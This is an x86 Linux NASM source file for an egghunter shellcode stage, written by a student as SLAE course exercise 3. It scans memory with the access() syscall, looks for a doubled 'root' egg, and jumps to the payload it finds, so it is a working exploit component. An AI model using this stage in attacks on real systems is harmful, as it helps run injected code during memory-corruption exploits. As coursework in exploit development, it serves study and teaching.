;Filename: access-re-egghunter.nasm
;Author: Jonathan So
;Student ID: SLAE-1470
;SLAE-Exercise 3

global _start

section .text

_start:
	xor edx,edx
setup:
	or dx,0xfff
next_address:
	inc edx
	lea ebx,[edx+0x4]	#Actually an optimization
	push byte +0x21
	pop eax
	int 0x80
	cmp al, 0xf2
	jz setup
	mov eax, 0x746F6F72
	mov edi, edx
	scasd
	jnz next_address
	scasd
	jnz next_address
	jmp edi	


